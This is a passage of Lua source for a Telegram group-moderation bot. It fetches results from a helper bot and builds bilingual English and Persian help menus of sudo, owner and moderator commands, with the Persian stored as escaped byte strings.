  end
end
function GetHelper(msg, query, bot, stEN, stFA)
  function found(arg, data)
    local inline_query_cb = function(arg, data)
      if data.results_ and data.results_[0] then
        tdcli.sendInlineQueryResultMessage(msg.to.id, 0, 0, 1, data.inline_query_id_, data.results_[0].id_, dl_cb, nil)
      else
        if not redis:get("gp_lang:" .. msg.to.id) then
          text = stEN or "`Helper Bot is not online!`"
        else
          text = stFA or "`\216\177\216\168\216\167\216\170 \218\169\217\133\218\169\219\140 \216\177\217\136\216\180\217\134 \217\134\219\140\216\179\216\170!`"
        end
        return tdcli.sendMessage(msg.to.id, msg.id, 0, text, 0, "md")
      end
    end
    tdcli.getInlineQueryResults(data.id_, msg.to.id, 0, 0, query, 0, inline_query_cb, nil)
  end
  if bot then
    Helper = bot
  else
    Helper = _config.Helper
  end
  tdcli.searchPublicChat(Helper, found, nil)
end
function GetCmds(lang)
  if not lang then
    Helps = {
      HelpForSudo = "\240\159\145\137 Cmds For Sudo:\nEMJ `install` *Insatll Group On Bot*\nEMJ `remove` *Remove Group From Bot*\nEMJ `editBbot` *Edit Bot Returns*\nEMJ `sudoaccess` [`ID`] *Change Sudo Access*\nEMJ `vip` *Set Group For Remove ADS*\nEMJ `sendpm` [`TEXT`] *Send Message To All Bot Groups*\nEMJ `sendpm` [`ID`] *Send Message To A Group With ID*\nEMJ `banall` [`ID`] *Ban User From All Bot Groups*\nEMJ `unbanall` [`ID`] *Unban User From All Bot Groups*\nEMJ `gbanlist` *Show Banall list*\nEMJ `reload` *Reload Plugins*\nEMJ `setsudo` [`ID`] *Promote User To Sudo*\nEMJ `delsudo` [`ID`] *Demote User From Sudo*\nEMJ `sudolist` *Show Bot Sudo List*\nEMJ `leave` [`LINK`]\nEMJ `autoleave` *enable/disable/status*\nEMJ `creategroup` *Create Group With Bot*\nEMJ `createsuper` *Create SuperGroup With Bot*\nEMJ `chats` *Show Bot Chats*\nEMJ `clear cache` *Cleare Telegram-Cli Cache*\nEMJ `join` *Bot Add You To A Group*\nEMJ `charge` [`NUMBER`] *Charge Group*\nEMJ `import` [`LINK`] *Bot join to link*\nEMJ `addreply` {Q} Answer\nEMJ `delreply` {Q} Answer\nEMJ `allreply` {Q}\nEMJ `replyaccess` {Q} [`RANK`]\n\nYou can use: CONFIG",
      HelpForOwner = "\240\159\145\137 Cmds For Owner:\nEMJ `setowner` *Set Owner For Group*\nEMJ `unblock` [`ID`] *Unblock User Form Block List*\nEMJ `setchannel` *Set Group Channel For Forced Join*\nEMJ `setforcedinvite` *Set Members For Invite*\nEMJ `addsettings` [`NAME`] *Add A Private Settings*\nEMJ `delsettings` [`NAME`] *Delete A Private Settings*\nEMJ `setmaxwarn` [`NUMBER`]\nEMJ `invitekicked` *Invite Kicked Members*\nEMJ `delowner` *Remove Owner From Group*\nEMJ `promote` *Promote User To Moderator*\nEMJ `demote` *Demote User From Moderator*\nEMJ `ownerlist` *Get List of Group Owners*\nEMJ `setlink` *Set Group Link For Bot*\nEMJ `clean` *mods/filterlist/rules/welcome/bans/silentlist/reportlist/blacklist/bots/vain/tabchi*\nEMJ `access` *owner/moderator/member*\nEMJ `setlang` [`en`/`fa`] *Change Chat Language*\nEMJ `photoid` [`on`/`off`] *Show Photo in ID Command*\nEMJ `maxchat` [`NUMBER`] *Set Group Max Chat*\nEMJ `lockgroup` [`H`:`M`] [`H`:`M`] *Lock Chat in A Time*\nEMJ `unlockgroup` *Unlock Chat*\nEMJ `sense` [`on`/`off`] *Change Bot Sense*\nEMJ `tosuper` *Change Chat to SuperGroup*\nEMJ `helpme` [`TEXT`] *Send Help To Bot Owner*\nEMJ `warnstatus` [`silent`/`block`]\nEMJ `config` *Promote all group admins*\nEMJ `backup` *Create Backup From Group Settings*\nEMJ `getbackup` *Use Saved Backup For Change Settings*\nEMJ `rmsg`/`delmsg` [`1`-`1000`] *Clean Group Messages*\n\nYou can use: CONFIG",
      HelpForModerator = "\240\159\145\137 Cmds For Moderator:\nEMJ `id` *Get ID of User*\nEMJ `setfloodtime` [`NUMBER`]\nEMJ `pin` *Pin A Message in Group*\nEMJ `unpin` *Unpin A Message From Group*\nEMJ `modlist` *Get List of Group Moderators*\nEMJ `lock` *Lock or Unlock An item in Group*\nEMJ `link` *Get Groups Link*\nEMJ `link pv` *Get Groups Link in Pv*\nEMJ `newlink` *Create New Link For Group With Bot*\nEMJ `rules` *Get Group Rules*\nEMJ `settings` *Show Group Settings*\nEMJ `setrules` *Set Group Rules*\nEMJ `setname` *Set Group Name*\nEMJ `setflood` *Change Value of Flood*\nEMJ `res` *Result From UserName*\nEMJ `filterlist` *Show Group Filter List*\nEMJ `setwelcome` *Set Group Welcome*\nEMJ `welcome` [`on`/`off`] *Set Welcome ON or OFF*\nEMJ `mute time` [`NUMBER`] *Change Time of Mute User*\nEMJ `mute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `unmute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `mymute`/`mm` *Get Time of Your Mute*\nEMJ `cmds` *Show Cmds Text*\nEMJ `banlist` *Show Group Ban List*\nEMJ `silent` *Silent User From Group*\nEMJ `unsilent` *Unsilent User From Group*\nEMJ `silentlist` *Show Silent List*\nEMJ `block` *Kick User From Group*\nEMJ `delall` *Delete All Message of User*\nEMJ `filter` *Filter Word From Group*\nEMJ `allow` *Allow Word or User From Group*\nEMJ `allowlist` *Show Allow List*\nEMJ `report` *Report A Text of User*\nEMJ `reportlist` *Show Report List*\nEMJ `check` *Check Groups Charge*\nEMJ `votemute` [`ID`] *Vote For Mute User*\nEMJ `delmute` [`ID`] *Delete Votes of User*\nEMJ `warn` [`Reason`] *Warn User With Reason*\nEMJ `delwarn` [`ID`] *Delete Warn of User*\nEMJ `nerkh` *Show Bot Nerk*\nEMJ `setmaxwords` [`NUMBER`] *Set Group Messages Max Words*\n\nYou can use: CONFIG"
    }
  else
    Helps = {
      HelpForSudo = "\240\159\145\137 Cmds For Sudo:\nEMJ `install` *\217\134\216\181\216\168 \218\175\216\177\217\136\217\135 \216\177\217\136\219\140 \216\177\216\168\216\167\216\170*\nEMJ `remove` *\216\173\216\176\217\129 \218\175\216\177\217\136\217\135 \216\167\216\178 \216\177\216\168\216\167\216\170*\nEMJ `editBbot` *\217\136\219\140\216\177\216\167\219\140\216\180 \217\133\216\170\217\134 \217\135\216\167\219\140 \216\168\216\177\218\175\216\180\216\170\219\140 \216\177\216\168\216\167\216\170*\nEMJ `sudoaccess` [`ID`] *\216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \217\135\216\167\219\140 \216\179\217\136\216\175\217\136*\nEMJ `vip` *\216\170\217\134\216\184\219\140\217\133 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\173\216\176\217\129 \216\170\216\168\217\132\219\140\216\186\216\167\216\170*\nEMJ `sendpm` [`TEXT`] *\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170*\nEMJ `sendpm` [`ID`] *\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \219\140\218\169 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\162\219\140\216\175\219\140*\nEMJ `banall` [`ID`] *\217\133\216\173\216\177\217\136\217\133 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170*\nEMJ `unbanall` [`ID`] *\216\162\217\134\216\168\217\134 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170*\nEMJ `gbanlist` *\217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \217\133\216\173\216\177\217\136\217\133\216\167\217\134 \216\167\216\178 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167*\nEMJ `reload` *\216\177\219\140\217\132\217\136\216\175 \217\190\217\132\216\167\218\175\219\140\217\134 \217\135\216\167*\nEMJ `setsudo` [`ID`] *\216\167\216\177\216\170\217\130\216\167 \216\180\216\174\216\181 \216\168\217\135 \216\179\217\136\216\175\217\136*\nEMJ `delsudo` [`ID`] *\216\170\217\134\216\178\217\132 \217\133\217\130\216\167\217\133 \216\180\216\174\216\181 \216\167\216\178 \216\179\217\136\216\175\217\136*\nEMJ `sudolist` *\217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136 \217\135\216\167*\nEMJ `leave` [`LINK`]\nEMJ `autoleave` *enable/disable/status*\nEMJ `creategroup` *\216\179\216\167\216\174\216\170 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\177\216\168\216\167\216\170*\nEMJ `createsuper` *\216\179\216\167\216\174\216\170 \216\167\216\168\216\177 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\177\216\168\216\167\216\170*\nEMJ `chats` *\217\134\217\133\216\167\219\140\216\180 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170*\nEMJ `clear cache` *\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \218\169\216\180 \217\135\216\167\219\140 Telegram-Cli*\nEMJ `join` *\216\177\216\168\216\167\216\170 \216\180\217\133\216\167 \216\177\216\167 \216\168\217\135 \218\175\216\177\217\136\217\135 \216\167\216\182\216\167\217\129\217\135 \217\133\219\140\218\169\217\134\216\175*\nEMJ `charge` [`NUMBER`] *\216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135*\nEMJ `import` [`LINK`] *\216\177\216\168\216\167\216\170 \216\172\217\136\219\140\217\134 \217\133\219\140\216\175\217\135 \216\168\217\135 \217\132\219\140\217\134\218\169*\nEMJ `addreply` {\216\179\217\136\216\167\217\132} \217\190\216\167\216\179\216\174\nEMJ `delreply` {\216\179\217\136\216\167\217\132} \217\190\216\167\216\179\216\174\nEMJ `allreply` {\216\179\217\136\216\167\217\132}\nEMJ `replyaccess` {Q} [`\217\133\217\130\216\167\217\133`]\n\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134\217\135\216\167 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175: CONFIG",
      HelpForOwner = "\240\159\145\137 Cmds For Owner:\nEMJ `setowner` *\216\170\217\134\216\184\219\140\217\133 \216\181\216\167\216\173\216\168 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135*\nEMJ `unblock` [`ID`] *\216\162\216\178\216\167\216\175 \216\179\216\167\216\178\219\140 \218\169\216\167\216\177\216\168\216\177 \216\167\216\178 \217\132\219\140\216\179\216\170 \217\133\216\179\216\175\217\136\216\175\219\140*\nEMJ `setchannel` *\216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\185\216\182\217\136\219\140\216\170 \216\167\216\172\216\168\216\167\216\177\219\140*\nEMJ `setforcedinvite` *\216\170\217\134\216\184\219\140\217\133 \216\185\216\182\217\136 \216\168\216\177\216\167\219\140 \216\175\216\185\217\136\216\170*\nEMJ `addsettings` [`NAME`] *\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\174\216\181\217\136\216\181\219\140*\nEMJ `delsettings` [`NAME`] *\216\173\216\176\217\129 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\174\216\181\217\136\216\181\219\140*\nEMJ `setmaxwarn` [`NUMBER`]\nEMJ `invitekicked` *\216\175\216\185\217\136\216\170 \216\167\216\185\216\182\216\167 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\135*\nEMJ `delowner` *\216\173\216\176\217\129 \216\181\216\167\216\173\216\168 \216\167\216\178 \218\175\216\177\217\136\217\135*\nEMJ `promote` *\216\167\216\177\216\170\217\130\216\167 \216\180\216\174\216\181 \216\168\217\135 \216\167\216\175\217\133\219\140\217\134 \218\175\216\177\217\136\217\135*\nEMJ `demote` *\216\170\217\134\216\178\219\140\217\132 \217\133\217\130\216\167\217\133 \216\180\216\174\216\181 \216\167\216\178 \216\167\216\175\217\133\219\140\217\134\219\140 \218\175\216\177\217\136\217\135*\nEMJ `ownerlist` *\218\175\216\177\217\129\216\170\217\134 \217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135*\nEMJ `setlink` *\216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\177\216\168\216\167\216\170*\nEMJ `clean` *mods/filterlist/rules/welcome/bans/silentlist/reportlist/blacklist/bots/vain/tabchi*\nEMJ `access` *owner/moderator/member*\nEMJ `setlang` [`en`/`fa`] *\216\170\216\186\219\140\219\140\216\177 \216\178\216\168\216\167\217\134 \218\175\216\177\217\136\217\135*\nEMJ `photoid` [`on`/`off`] *\217\134\217\133\216\167\219\140\216\180 \216\185\218\169\216\179 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \216\175\216\179\216\170\217\136\216\177 \216\162\219\140\216\175\219\140*\nEMJ `maxchat` [`NUMBER`] *\216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \218\134\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135*\nEMJ `lockgroup` [`H`:`M`] [`H`:`M`] *\217\130\217\129\217\132 \218\175\216\177\217\136\217\135 \216\175\216\177 \219\140\218\169 \216\178\217\133\216\167\217\134 \217\133\216\180\216\174\216\181*\nEMJ `unlockgroup` *\216\168\216\167\216\178\218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135*\nEMJ `sense` [`on`/`off`] *\216\170\216\186\219\140\219\140\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \217\135\217\136\216\180 \216\177\216\168\216\167\216\170*\nEMJ `tosuper` *\216\170\216\186\219\140\219\140\216\177 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\167\216\168\216\177 \218\175\216\177\217\136\217\135*\nEMJ `helpme` [`TEXT`] *\216\167\216\177\216\179\216\167\217\132 \217\133\216\170\217\134 \216\168\217\135 \216\181\216\167\216\173\216\168 \216\177\216\168\216\167\216\170*\nEMJ `warnstatus` [`silent`/`block`]\nEMJ `config` *\216\167\216\177\216\170\217\130\216\167 \216\170\217\133\216\167\217\133\219\140 \216\167\216\175\217\133\219\140\217\134 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135*\nEMJ `backup` *\216\168\218\169 \216\162\217\190 \218\175\216\177\217\129\216\170\217\134 \216\167\216\178 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135*\nEMJ `getbackup` *\216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170*\nEMJ `rmsg`/`delmsg` [`1`-`1000`] *\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135*\n\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134\217\135\216\167 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175: CONFIG",
      HelpForModerator = "\240\159\145\137 Cmds For Moderator:\nEMJ `id` *\217\134\217\133\216\167\219\140\216\180 \216\162\219\140\216\175\219\140 \219\140\218\169 \216\180\216\174\216\181*\nEMJ `setfloodtime` [`NUMBER`]\nEMJ `pin` *\216\179\217\134\216\172\216\167\217\130 \218\169\216\177\216\175\217\134 \217\190\219\140\216\167\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135*\nEMJ `unpin` *\218\169\217\134\216\175\217\134 \216\179\217\134\216\172\216\167\217\130 \217\190\219\140\216\167\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135*\nEMJ `modlist` *\217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135*\nEMJ `lock` *\217\130\217\129\217\132 \219\140\218\169 \216\162\219\140\216\170\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135 \219\140\216\167 \216\168\216\167\216\178\218\169\216\177\216\175\217\134 \216\162\217\134*\nEMJ `link` *\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135*\nEMJ `link pv` *\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\175\216\177 \217\190\219\140\217\136\219\140*\nEMJ `newlink` *\216\179\216\167\216\174\216\170 \217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\177\216\168\216\167\216\170*\nEMJ `rules` *\216\175\216\177\219\140\216\167\217\129\216\170 \217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135*\nEMJ `settings` *\217\134\217\133\216\167\219\140\216\180 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135*\nEMJ `setrules` *\216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135*\nEMJ `setname` *\216\170\217\134\216\184\219\140\217\133 \216\167\216\179\217\133 \218\175\216\177\217\136\217\135*\nEMJ `setflood` *\216\170\216\186\219\140\219\140\216\177 \217\133\217\130\216\175\216\167\216\177 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140*\nEMJ `res` *\216\167\216\183\217\132\216\167\216\185\216\167\216\170 \219\140\218\169 \219\140\217\136\216\178\216\177\217\134\219\140\217\133*\nEMJ `filterlist` *\217\134\217\133\216\167\219\140\216\180 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \218\175\216\177\217\136\217\135*\nEMJ `setwelcome` *\216\170\217\134\216\184\219\140\217\133 \217\133\216\170\217\134 \216\174\217\136\216\180 \216\162\217\133\216\175\218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135*\nEMJ `welcome` [`on`/`off`] *\216\170\217\134\216\184\219\140\217\133 \216\174\217\136\216\180 \216\162\217\133\216\175\218\175\217\136\219\140\219\140*\nEMJ `mute time` [`NUMBER`] *\216\170\216\186\219\140\219\140\216\177 \216\170\216\167\219\140\217\133 \217\133\219\140\217\136\216\170 \219\140\218\169 \216\180\216\174\216\181*\nEMJ `mute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `unmute` [*sticker*/*photo*/*video*/*voice*/*audio*/*gif*] [`ID`]\nEMJ `mymute`/`mm` *\217\134\217\133\216\167\219\140\216\180 \216\178\217\133\216\167\217\134 \217\133\219\140\217\136\216\170 \216\174\217\136\216\175\216\170\216\167\217\134*\nEMJ `cmds` *\217\134\217\133\216\167\219\140\216\180 \217\133\216\170\217\134 \216\175\216\179\216\170\217\136\216\177\216\167\216\170*\nEMJ `banlist` *\217\134\217\133\216\167\219\140\216\180 \216\167\217\129\216\177\216\167\216\175 \217\133\216\173\216\177\217\136\217\133 \218\175\216\177\217\136\217\135*\nEMJ `silent` *\216\174\217\129\217\135 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \218\175\216\177\217\136\217\135*\nEMJ `unsilent` *\216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \218\175\216\177\217\136\217\135*\nEMJ `silentlist` *\217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170*\nEMJ `block` *\216\167\216\174\216\177\216\167\216\172 \216\180\216\174\216\181 \216\167\216\178 \218\175\216\177\217\136\217\135*\nEMJ `delall` *\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\170\217\133\216\167\217\133 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177*\nEMJ `filter` *\217\129\219\140\217\132\216\170\216\177 \218\169\217\132\217\133\217\135 \216\167\216\178 \218\175\216\177\217\136\217\135*\nEMJ `allow` *\217\133\216\172\216\167\216\178 \218\169\216\177\216\175\217\134 \219\140\218\169 \218\169\217\132\217\133\217\135 \219\140\216\167 \216\180\216\174\216\181 \216\175\216\177 \218\175\216\177\217\136\217\135*\nEMJ `allowlist` *\217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178*\nEMJ `report` *\218\175\216\178\216\167\216\177\216\180 \219\140\218\169 \217\133\216\170\217\134 \216\167\216\178 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177*\nEMJ `reportlist` *\217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180\216\167\216\170*\nEMJ `check` *\216\168\216\177\216\177\216\179\219\140 \216\180\216\167\216\177\218\152 \219\140\218\169 \218\175\216\177\217\136\217\135*\nEMJ `votemute` [`ID`] *\216\177\216\167\219\140 \216\175\216\167\216\175\217\134 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170 \216\180\216\175\217\134 \219\140\218\169 \216\180\216\174\216\181*\nEMJ `delmute` [`ID`] *\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\177\216\167\219\140 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170*\nEMJ `warn` [`Reason`] *\216\167\216\174\216\183\216\167\216\177 \216\168\217\135 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177 \216\168\216\167 \216\175\217\132\219\140\217\132*\nEMJ `delwarn` [`ID`] *\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\167\216\174\216\183\216\167\216\177 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177*\nEMJ `nerkh` *\217\134\217\133\216\167\219\140\216\180 \217\134\216\177\216\174 \216\177\216\168\216\167\216\170*\nEMJ `setmaxwords` [`NUMBER`] *\216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135*\n\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134\217\135\216\167 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175: CONFIG"
    }
  end
  if redis:get("EditBot:helpsudo") then
    Helps.HelpForSudo = redis:get("EditBot:helpsudo")
  end
  if redis:get("EditBot:helpownerEN") and not lang then
    Helps.HelpForOwner = redis:get("EditBot:helpownerEN")
  elseif redis:get("EditBot:helpownerFA") and lang then
    Helps.HelpForOwner = redis:get("EditBot:helpownerFA")
  end
  if redis:get("EditBot:helpmodEN") and not lang then
    Helps.HelpForModerator = redis:get("EditBot:helpmodEN")
  elseif redis:get("EditBot:helpmodFA") and lang then
    Helps.HelpForModerator = redis:get("EditBot:helpmodFA")
  end
  Emoji = redis:get("EditBot:cmdsemoji") or "\226\149\160 "
  Helps.HelpForSudo = Helps.HelpForSudo:gsub("EMJ", Emoji)
  Helps.HelpForOwner = Helps.HelpForOwner:gsub("EMJ", Emoji)
  Helps.HelpForModerator = Helps.HelpForModerator:gsub("EMJ", Emoji)
  if _config.cmd == "^" then
    if not lang then
      Symbol = "Commands Has Not Symbol"
    else
      Symbol = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\216\175\217\136\217\134 \216\185\217\132\216\167\217\133\216\170 \217\135\216\179\216\170\217\134\216\175"
    end
  else
    sm = _config.cmd
    Symbol = ""
    if sm:match("!") then
      Symbol = Symbol .. "!"
    end
    if sm:match("/") then
      Symbol = Symbol .. "/"
    end
    if sm:match("#") then
      Symbol = Symbol .. "#"
    end
  end
  Helps.HelpForSudo = Helps.HelpForSudo:gsub("CONFIG", Symbol)
  Helps.HelpForOwner = Helps.HelpForOwner:gsub("CONFIG", Symbol)
  Helps.HelpForModerator = Helps.HelpForModerator:gsub("CONFIG", Symbol)
  return Helps
end
function GetFaCmds()
  Helps = {
    HelpForSudo = "\226\152\145\239\184\143 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\216\177\216\167\219\140 \216\179\217\136\216\175\217\136:\nEMJ \217\134\216\181\216\168 \218\175\216\177\217\136\217\135\240\159\145\136 \217\134\216\181\216\168 \218\175\216\177\217\136\217\135 \216\177\217\136\219\140 \216\177\216\168\216\167\216\170\nEMJ \216\173\216\176\217\129 \218\175\216\177\217\136\217\135\240\159\145\136 \216\173\216\176\217\129 \218\175\216\177\217\136\217\135 \216\167\216\178 \216\177\216\168\216\167\216\170\nEMJ \217\136\219\140\216\177\216\167\219\140\216\180 \216\177\216\168\216\167\216\170\240\159\145\136 \217\136\219\140\216\177\216\167\219\140\216\180 \217\133\216\170\217\134 \217\135\216\167\219\140 \216\168\216\177\218\175\216\180\216\170\219\140 \216\177\216\168\216\167\216\170\nEMJ \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136\240\159\145\136 [\216\162\219\140\216\175\219\140] \216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \217\135\216\167\219\140 \216\179\217\136\216\175\217\136\nEMJ \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133\240\159\145\136 \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170\nEMJ \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133\240\159\145\136 [\216\162\219\140\216\175\219\140] \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \219\140\218\169 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\162\219\140\216\175\219\140\nEMJ \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134\240\159\145\136 [\216\162\219\140\216\175\219\140] \217\133\216\173\216\177\217\136\217\133 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170\nEMJ \218\175\217\132\217\136\216\168\216\167\217\132 \216\162\217\134\216\168\217\134\240\159\145\136 [\216\162\219\140\216\175\219\140] \216\162\217\134\216\168\217\134 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170\nEMJ \217\132\219\140\216\179\216\170 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \217\133\216\173\216\177\217\136\217\133\216\167\217\134 \216\167\216\178 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167\nEMJ \216\177\219\140\217\132\217\136\216\175\240\159\145\136 \216\177\219\140\217\132\217\136\216\175 \217\190\217\132\216\167\218\175\219\140\217\134 \217\135\216\167\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\179\217\136\216\175\217\136\240\159\145\136 [\216\162\219\140\216\175\219\140] \216\167\216\177\216\170\217\130\216\167 \216\180\216\174\216\181 \216\168\217\135 \216\179\217\136\216\175\217\136\nEMJ \216\173\216\176\217\129 \216\179\217\136\216\175\217\136\240\159\145\136 [\216\162\219\140\216\175\219\140] \216\170\217\134\216\178\217\132 \217\133\217\130\216\167\217\133 \216\180\216\174\216\181 \216\167\216\178 \216\179\217\136\216\175\217\136\nEMJ \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136 \217\135\216\167\nEMJ \216\170\216\177\218\169 \218\175\216\177\217\136\217\135\240\159\145\136\nEMJ \216\170\216\177\218\169 \216\174\217\136\216\175\218\169\216\167\216\177\240\159\145\136 \217\129\216\185\216\167\217\132/\216\186\219\140\216\177\217\129\216\185\216\167\217\132/\217\136\216\182\216\185\219\140\216\170\nEMJ \216\179\216\167\216\174\216\170 \218\175\216\177\217\136\217\135\240\159\145\136 \216\179\216\167\216\174\216\170 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\177\216\168\216\167\216\170\nEMJ \216\179\216\167\216\174\216\170 \216\167\216\168\216\177\218\175\216\177\217\136\217\135\240\159\145\136 \216\179\216\167\216\174\216\170 \216\167\216\168\216\177 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\177\216\168\216\167\216\170\nEMJ \218\134\216\170 \217\135\216\167\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 